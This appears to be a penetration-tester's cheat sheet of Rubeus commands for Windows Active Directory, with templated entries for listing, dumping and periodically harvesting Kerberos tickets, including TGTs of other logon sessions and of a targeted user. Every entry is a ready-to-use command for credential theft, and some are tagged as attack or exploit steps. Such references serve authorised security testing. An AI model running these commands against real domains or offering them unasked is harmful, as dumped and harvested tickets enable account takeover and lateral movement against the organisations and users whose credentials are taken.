# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 



## triage - list tickets
#cat/UTILS  
```powershell
.\Rubeus.exe 
```


## triage - list tickets for a service
#cat/UTILS 
```powershell
.\Rubeus.exe triage /service:<service|ldap>
```


## klist - details of current session tickets
#cat/UTILS 
```powershell
.\Rubeus.exe klist
```

## klist - details of  other session tickets
#cat/UTILS 
```powershell
.\Rubeus.exe klist /luid:<luid>
```

## dump - extract tickets of current session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap
```

## dump - extract tgt of current session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /service:krbtgt
```

## dump - extract tickets of another session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /luid:<luid>
```

## dump - extract tgt of another session 
#cat/UTILS 
```powershell
.\Rubeus.exe dump /nowrap /luid:<luid> /service:krbtgt
```

## monitor - extract periodically tgt
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5>
```

## monitor - extract periodically tgt of a user
#cat/ATTACK/EXPLOIT  
```powershell
.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5> /targetuser:<target_user>
```

## harvest -  monitor + auto renewal before expiration
#cat/UTILS 
```powershell
.\Rubeus.exe harvest /nowrap /interval:<sec_delai|5>
```